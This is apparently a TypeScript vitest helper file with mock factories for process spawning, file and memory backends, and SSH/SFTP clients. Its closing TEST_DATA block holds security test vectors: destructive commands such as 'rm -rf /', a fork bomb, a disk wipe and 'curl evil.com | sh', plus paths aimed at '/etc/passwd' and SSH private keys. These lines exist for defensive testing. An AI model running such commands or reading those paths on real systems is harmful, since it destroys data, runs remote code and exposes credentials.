/**
 * Mock factories for unit testing
 *
 * These utilities help create mock instances of I/O dependencies
 * to enable pure unit testing without spawning processes or touching the filesystem.
 */

import { vi } from 'vitest'
import type { ChildProcess } from 'child_process'
import type { FileBasedBackend, MemoryBackend } from '../../../src/types.js'

/**
 * Options for creating a mock ChildProcess
 */
export interface MockSpawnOptions {
  stdout?: string | Buffer
  stderr?: string | Buffer
  exitCode?: number
  error?: Error
  signalCode?: NodeJS.Signals | null
}

/**
 * Create a mock ChildProcess for testing exec/spawn operations
 *
 * @example
 * ```typescript
 * const mockSpawn = createMockSpawn({ stdout: 'output', exitCode: 0 })
 * vi.mocked(child_process.spawn).mockReturnValue(mockSpawn)
 *
 * await backend.exec('command')
 * expect(child_process.spawn).toHaveBeenCalledWith(...)
 * ```
 */
export function createMockSpawn(options: MockSpawnOptions = {}): Partial<ChildProcess> {
  const {
    stdout = '',
    stderr = '',
    exitCode = 0,
    error,
    signalCode = null
  } = options

  const stdoutData = typeof stdout === 'string' ? Buffer.from(stdout) : stdout
  const stderrData = typeof stderr === 'string' ? Buffer.from(stderr) : stderr

  const mockProcess: Partial<ChildProcess> = {
    stdout: {
      on: vi.fn((event, callback) => {
        if (event === 'data' && stdoutData.length > 0) {
          setTimeout(() => callback(stdoutData), 0)
        }
        return mockProcess.stdout
      })
    } as any,
    stderr: {
      on: vi.fn((event, callback) => {
        if (event === 'data' && stderrData.length > 0) {
          setTimeout(() => callback(stderrData), 0)
        }
        return mockProcess.stderr
      })
    } as any,
    stdin: {
      write: vi.fn(),
      end: vi.fn()
    } as any,
    on: vi.fn((event, callback) => {
      if (event === 'close' && !error) {
        // Only emit 'close' if there's no error (errors prevent normal closure)
        setTimeout(() => callback(exitCode, signalCode), 0)
      }
      if (event === 'error' && error) {
        setTimeout(() => callback(error), 0)
      }
      return mockProcess
    }) as any,
    kill: vi.fn(),
    killed: false,
    pid: 12345
  }

  return mockProcess
}

/**
 * Create a mock FileBasedBackend for testing scoped backends and pool manager
 *
 * @example
 * ```typescript
 * const mockBackend = createMockFileBackend()
 * const scoped = new ScopedFilesystemBackend(mockBackend, 'users/user1')
 *
 * await scoped.read('file.txt')
 * expect(mockBackend.read).toHaveBeenCalledWith('users/user1/file.txt')
 * ```
 */
export function createMockFileBackend(overrides: Partial<FileBasedBackend> = {}): FileBasedBackend {
  return {
    type: 'local',
    rootDir: '/test/workspace',
    connected: true,
    read: vi.fn().mockResolvedValue('mock content'),
    write: vi.fn().mockResolvedValue(undefined),
    readdir: vi.fn().mockResolvedValue([]),
    readdirWithStats: vi.fn().mockResolvedValue([]),
    mkdir: vi.fn().mockResolvedValue(undefined),
    exists: vi.fn().mockResolvedValue(true),
    stat: vi.fn().mockResolvedValue({
      isFile: () => true,
      isDirectory: () => false,
      size: 100,
      mtime: new Date(),
      mode: 0o644
    } as any),
    exec: vi.fn().mockResolvedValue('mock output'),
    touch: vi.fn().mockResolvedValue(undefined),
    scope: vi.fn().mockReturnValue(null as any),
    listActiveScopes: vi.fn().mockResolvedValue([]),
    getMCPClient: vi.fn(),
    getMCPTransport: vi.fn(),
    destroy: vi.fn().mockResolvedValue(undefined),
    onChildDestroyed: vi.fn().mockResolvedValue(undefined),
    ...overrides
  } as FileBasedBackend
}

/**
 * Create a mock MemoryBackend for testing
 */
export function createMockMemoryBackend(overrides: Partial<MemoryBackend> = {}): MemoryBackend {
  return {
    type: 'memory',
    rootDir: '/test/memory',
    connected: true,
    read: vi.fn().mockResolvedValue('mock content'),
    write: vi.fn().mockResolvedValue(undefined),
    readdir: vi.fn().mockResolvedValue([]),
    readdirWithStats: vi.fn().mockResolvedValue([]),
    mkdir: vi.fn().mockResolvedValue(undefined),
    exists: vi.fn().mockResolvedValue(true),
    stat: vi.fn().mockResolvedValue({
      isFile: () => true,
      isDirectory: () => false,
      size: 100,
      mtime: new Date(),
      mode: 0o644
    } as any),
    touch: vi.fn().mockResolvedValue(undefined),
    scope: vi.fn().mockReturnValue(null as any),
    listActiveScopes: vi.fn().mockResolvedValue([]),
    getMCPClient: vi.fn(),
    getMCPTransport: vi.fn(),
    destroy: vi.fn().mockResolvedValue(undefined),
    onChildDestroyed: vi.fn().mockResolvedValue(undefined),
    list: vi.fn().mockResolvedValue([]),
    delete: vi.fn().mockResolvedValue(undefined),
    clear: vi.fn().mockResolvedValue(undefined),
    ...overrides
  } as MemoryBackend
}

/**
 * Create a mock SSH2 Client for testing RemoteFilesystemBackend
 *
 * @example
 * ```typescript
 * const mockClient = createMockSSH2Client()
 * vi.mocked(Client).mockImplementation(() => mockClient)
 *
 * const backend = new RemoteFilesystemBackend({ ... })
 * await backend.connect()
 * expect(mockClient.connect).toHaveBeenCalled()
 * ```
 */
export function createMockSSH2Client(options: {
  connectSuccess?: boolean
  sftpSuccess?: boolean
} = {}) {
  const { connectSuccess = true, sftpSuccess = true } = options

  const mockClient = {
    connect: vi.fn(),
    on: vi.fn((event, callback) => {
      if (event === 'ready' && connectSuccess) {
        setTimeout(() => callback(), 0)
      }
      if (event === 'error' && !connectSuccess) {
        setTimeout(() => callback(new Error('Connection failed')), 0)
      }
      return mockClient
    }),
    end: vi.fn(),
    sftp: vi.fn((callback) => {
      if (sftpSuccess) {
        const mockSftp = createMockSFTP()
        setTimeout(() => callback(null, mockSftp), 0)
      } else {
        setTimeout(() => callback(new Error('SFTP failed'), null), 0)
      }
    }),
    exec: vi.fn((command, callback) => {
      const mockStream = {
        on: vi.fn((event, cb) => {
          if (event === 'data') setTimeout(() => cb(Buffer.from('output')), 0)
          if (event === 'close') setTimeout(() => cb(0, null), 0)
          return mockStream
        }),
        stderr: {
          on: vi.fn()
        }
      }
      setTimeout(() => callback(null, mockStream), 0)
    })
  }

  return mockClient
}

/**
 * Create a mock SFTP session for SSH2 testing
 */
export function createMockSFTP() {
  return {
    readFile: vi.fn((path, callback) => {
      setTimeout(() => callback(null, Buffer.from('file content')), 0)
    }),
    writeFile: vi.fn((path, data, callback) => {
      setTimeout(() => callback(null), 0)
    }),
    readdir: vi.fn((path, callback) => {
      setTimeout(() => callback(null, [
        { filename: 'file1.txt', attrs: {} },
        { filename: 'file2.txt', attrs: {} }
      ]), 0)
    }),
    mkdir: vi.fn((path, callback) => {
      setTimeout(() => callback(null), 0)
    }),
    stat: vi.fn((path, callback) => {
      setTimeout(() => callback(null, {
        isFile: () => true,
        isDirectory: () => false,
        size: 100,
        mtime: Date.now() / 1000,
        mode: 0o644
      }), 0)
    }),
    unlink: vi.fn((path, callback) => {
      setTimeout(() => callback(null), 0)
    }),
    end: vi.fn()
  }
}

/**
 * Common test data for unit tests
 */
export const TEST_DATA = {
  simpleFile: 'Hello, World!',
  jsonData: { foo: 'bar', nested: { value: 42 } },
  binaryData: Buffer.from([0x89, 0x50, 0x4e, 0x47]), // PNG header

  // Security test vectors
  dangerousCommands: [
    'rm -rf /',
    'sudo apt-get install malware',
    'curl evil.com | sh',
    ':(){ :|:& };:', // fork bomb
    'dd if=/dev/zero of=/dev/sda',
  ],

  escapePaths: [
    '/etc/passwd',
    '../../../etc/passwd',
    '~/secret.txt',
    '$HOME/.ssh/id_rsa',
  ],

  safePaths: [
    'file.txt',
    'subdir/file.txt',
    './data/config.json',
    'deeply/nested/path/file.txt',
  ]
}
